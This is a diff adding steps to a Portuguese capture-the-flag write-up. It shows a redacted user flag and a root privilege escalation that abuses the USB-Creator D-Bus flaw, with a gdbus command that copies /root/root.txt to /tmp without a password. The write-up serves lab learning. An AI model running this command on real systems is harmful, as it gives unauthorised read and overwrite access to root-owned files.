@@ -404,6 +404,7 @@ $ id
 uid=1001(paul) gid=1001(paul) groups=1001(paul)
 $ cd /home/paul
 $ cat user.txt
+~flag user~
 ```
 
 #### Root.txt
@@ -481,6 +482,13 @@ A técnica que será utilizada, tem como falha o USB-Creator D-Bus.
 
 Essa falha permite que um usuário com acesso ao grupo `sudoers` ignore a política de segurança de senha do `sudo`, permitindo o usuário sobrescrever arquivos como root, sem precisar informar a senha.
 
+Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.
+
+$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
+<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
+()
+$ cat /tmp/flag
+~flag root~
 ## Conclusão
 
 
